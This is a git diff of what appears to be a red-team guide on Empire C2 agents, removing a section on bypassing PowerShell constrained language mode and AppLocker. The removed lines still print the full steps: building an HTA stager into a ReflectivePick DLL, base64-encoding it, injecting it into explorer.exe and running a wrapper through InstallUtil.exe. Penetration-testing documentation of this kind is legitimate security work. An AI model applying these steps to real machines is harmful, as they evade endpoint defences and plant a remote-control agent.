@@ -128,46 +128,7 @@ Copypaste the empire listener in the interactive shell, and an agent should spaw
 
 Congratulations!
 
-## More advanced technique
 
-#### Bypassing powershell constrained mode and applocker
-
-This technique involves packing everything together several times to bypass all the security mechanisms. I recommend reading the article below and trying to replicate each step. Albeit, I have made a step by step overview of it below.  
-[https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell](https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell)
-
-1 Generate a listener and a hta stager using windows/hta
-
-2 Open ReflectivePick project in visual studio. Add the hta base64 shell stager where appropriate and compile the dll to `ReflectivePick_x64.dll`
-
-3 Use the following commands in PS to encode the DLL to base64 and pipe the results to a file
-
-```text
-$Content = Get-Content .\ReflectivePick_x64.dll -Encoding Byte
-$Encoded = [System.Convert]::ToBase64String($Content)
-$Encoded | Out-File "C:\Windows\Tasks\dll.txt"
-```
-
-4 Copypaste the content of dll.txt into a new variable in Invoke-ReflectivePEInjection.ps1
-
-```text
-$dllData = "DLLBASE64_GOES_HERE"
-$ProcId = (Get-Process explorer).Id
-$Bytes = [System.Convert]::FromBase64String($dllData)
-Invoke-ReflectivePEInjection -PEBytes $Bytes -ProcId $ProcId
-```
-
-5 Base64 encode the entire script using [https://www.base64encode.org/](https://www.base64encode.org/)  
-Open the Bypass project in VS and copypaste the base64 into the encoded variable.  
-Compile to Bypass.exe with VS.
-
-6 Use installutil.exe to execute bypass.exe
-
-```text
-set-location \\tsclient\lkylabs
-copy-item .\Bypass.exe c:\windows\tasks
-cd c:\windows\tasks
-C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe
-```
 
 ### Useful links
 
